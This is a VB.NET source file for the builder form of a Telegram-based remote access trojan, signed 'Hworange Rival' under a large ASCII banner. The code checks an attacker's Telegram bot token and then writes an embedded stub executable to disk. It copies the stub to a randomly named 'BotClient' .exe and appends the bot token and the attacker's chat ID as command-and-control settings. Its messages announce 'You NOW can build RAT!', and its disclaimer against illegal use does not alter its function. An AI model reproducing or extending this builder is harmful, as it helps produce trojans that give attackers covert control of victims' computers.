Public Class Mainer

    '                                                                                                                                                                                                                                                                                                                                     
    '                                                                                                                                                                                                                                                                                                                                     
    '                                     HHHHHHHHH     HHHHHHHHH                                                                                                                                                        RRRRRRRRRRRRRRRRR     iiii                                          lllllll                                      
    '                                     H:::::::H     H:::::::H                                                                                                                                                        R::::::::::::::::R   i::::i                                         l:::::l                                      
    '                                     H:::::::H     H:::::::H                                                                                                                                                        R::::::RRRRRR:::::R   iiii                                          l:::::l                                      
    '                                     HH::::::H     H::::::HH                                                                                                                                                        RR:::::R     R:::::R                                                l:::::l                                      
    '                                       H:::::H     H:::::Hwwwwwww           wwwww           wwwwwww ooooooooooo   rrrrr   rrrrrrrrr   aaaaaaaaaaaaa  nnnn  nnnnnnnn       ggggggggg   ggggg    eeeeeeeeeeee           R::::R     R:::::Riiiiiiivvvvvvv           vvvvvvvaaaaaaaaaaaaa    l::::l                                      
    '                 ::::::  ::::::        H:::::H     H:::::H w:::::w         w:::::w         w:::::woo:::::::::::oo r::::rrr:::::::::r  a::::::::::::a n:::nn::::::::nn    g:::::::::ggg::::g  ee::::::::::::ee         R::::R     R:::::Ri:::::i v:::::v         v:::::v a::::::::::::a   l::::l       ::::::  ::::::                 
    '                 ::::::  ::::::        H::::::HHHHH::::::H  w:::::w       w:::::::w       w:::::wo:::::::::::::::or:::::::::::::::::r aaaaaaaaa:::::an::::::::::::::nn  g:::::::::::::::::g e::::::eeeee:::::ee       R::::RRRRRR:::::R  i::::i  v:::::v       v:::::v  aaaaaaaaa:::::a  l::::l       ::::::  ::::::                 
    '                 ::::::  ::::::        H:::::::::::::::::H   w:::::w     w:::::::::w     w:::::w o:::::ooooo:::::orr::::::rrrrr::::::r         a::::ann:::::::::::::::ng::::::ggggg::::::gge::::::e     e:::::e       R:::::::::::::RR   i::::i   v:::::v     v:::::v            a::::a  l::::l       ::::::  ::::::                 
    '                                       H:::::::::::::::::H    w:::::w   w:::::w:::::w   w:::::w  o::::o     o::::o r:::::r     r:::::r  aaaaaaa:::::a  n:::::nnnn:::::ng:::::g     g:::::g e:::::::eeeee::::::e       R::::RRRRRR:::::R  i::::i    v:::::v   v:::::v      aaaaaaa:::::a  l::::l                                      
    '                                       H::::::HHHHH::::::H     w:::::w w:::::w w:::::w w:::::w   o::::o     o::::o r:::::r     rrrrrrraa::::::::::::a  n::::n    n::::ng:::::g     g:::::g e:::::::::::::::::e        R::::R     R:::::R i::::i     v:::::v v:::::v     aa::::::::::::a  l::::l                                      
    '                                       H:::::H     H:::::H      w:::::w:::::w   w:::::w:::::w    o::::o     o::::o r:::::r           a::::aaaa::::::a  n::::n    n::::ng:::::g     g:::::g e::::::eeeeeeeeeee         R::::R     R:::::R i::::i      v:::::v:::::v     a::::aaaa::::::a  l::::l                                      
    '                 ::::::  ::::::        H:::::H     H:::::H       w:::::::::w     w:::::::::w     o::::o     o::::o r:::::r          a::::a    a:::::a  n::::n    n::::ng::::::g    g:::::g e:::::::e                  R::::R     R:::::R i::::i       v:::::::::v     a::::a    a:::::a  l::::l       ::::::  ::::::                 
    '                 ::::::  ::::::      HH::::::H     H::::::HH      w:::::::w       w:::::::w      o:::::ooooo:::::o r:::::r          a::::a    a:::::a  n::::n    n::::ng:::::::ggggg:::::g e::::::::e               RR:::::R     R:::::Ri::::::i       v:::::::v      a::::a    a:::::a l::::::l      ::::::  ::::::                 
    ' ......  ......  ::::::  ::::::      H:::::::H     H:::::::H       w:::::w         w:::::w       o:::::::::::::::o r:::::r          a:::::aaaa::::::a  n::::n    n::::n g::::::::::::::::g  e::::::::eeeeeeee       R::::::R     R:::::Ri::::::i        v:::::v       a:::::aaaa::::::a l::::::l      ::::::  ::::::  ......  ...... 
    ' .::::.  .::::.                      H:::::::H     H:::::::H        w:::w           w:::w         oo:::::::::::oo  r:::::r           a::::::::::aa:::a n::::n    n::::n  gg::::::::::::::g   ee:::::::::::::e       R::::::R     R:::::Ri::::::i         v:::v         a::::::::::aa:::al::::::l                      .::::.  .::::. 
    ' ......  ......                      HHHHHHHHH     HHHHHHHHH         www             www            ooooooooooo    rrrrrrr            aaaaaaaaaa  aaaa nnnnnn    nnnnnn    gggggggg::::::g     eeeeeeeeeeeeee       RRRRRRRR     RRRRRRRiiiiiiii          vvv           aaaaaaaaaa  aaaallllllll                      ......  ...... 
    '                                                                                                                                                                                   g:::::g                                                                                                                                           
    '                                                                                                                                                                       gggggg      g:::::g                                                                                                                                           
    '                                                                                                                                                                       g:::::gg   gg:::::g                                                                                                                                           
    '                                                                                                                                                                        g::::::ggg:::::::g                                                                                                                                           
    '                                                                                                                                                                         gg:::::::::::::g                                                                                                                                            
    '                                                                                                                                                                           ggg::::::ggg                                                                                                                                              
    '                                                                                                                                                                              gggggg                                                                                                                                                 
    'Developed for fun in free Time. Do not use for Illegal activity.
    'i'm not responsable for your use
    'Enjoy !!!
    '__ ..:: Hworange Rival ;;..

    Dim tested As Boolean = False
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Net.ServicePointManager.SecurityProtocol = Net.SecurityProtocolType.Tls12
        If TextBox1.Text = "-" Or TextBox2.Text = "-" Then MsgBox("Set your Data FIRST!!") : Exit Sub
        Try : Dim BotClient = New Telegram.Bot.TelegramBotClient(TextBox1.Text) : BotClient.StartReceiving()
            If BotClient.IsReceiving Then MsgBox("API Connection Working!!! You NOW can build RAT!") : tested = True Else MsgBox("API Connection NOT Working!!!")
        Catch ex As Exception : MsgBox(ex.Message) : End Try
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If tested <> True Then MsgBox("First Test Connection!!") : Exit Sub
        Randomize() : Dim rnd As New Random
        sfd.FileName = "BotClient_" & rnd.Next(5, 90) & ".exe"
        If sfd.ShowDialog <> DialogResult.Cancel Then
            Dim theStub As String = CurDir() & "\stub.exe"
            If IO.File.Exists(theStub) = False Then IO.File.WriteAllBytes(theStub, My.Resources.StuBot)
            IO.File.Copy(theStub, sfd.FileName) 'Copy stub as Server
            IO.File.AppendAllText(sfd.FileName, "§" & TextBox1.Text & "§" & TextBox2.Text)
            Do While IO.File.Exists(theStub)
                Application.DoEvents()
                IO.File.Delete(theStub)
            Loop
            MsgBox("Created! Have fun!")
        End If
    End Sub
    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click
        MsgBox("First create your Bot after go on BotFatherBot '@BotFather' ..." & vbCrLf &
               "Generate and set here your BotFather API Token!!")
    End Sub
    Private Sub Label4_Click(sender As Object, e As EventArgs) Handles Label4.Click
        MsgBox("Set your Telegram ID.. " & vbCrLf &
            "Use '@chatIDrobot,@RawDataBot,ecc..' Generator for finding your Telegram ID..")
    End Sub
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        TextBox1.Text = Clipboard.GetText()
    End Sub
    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        TextBox2.Text = Clipboard.GetText()
    End Sub

    Private Sub Mainer_Load(sender As Object, e As EventArgs)
        MsgBox("Developed for fun. Use with responsability..Enjoy!! =)", MsgBoxStyle.Information)
    End Sub
End Class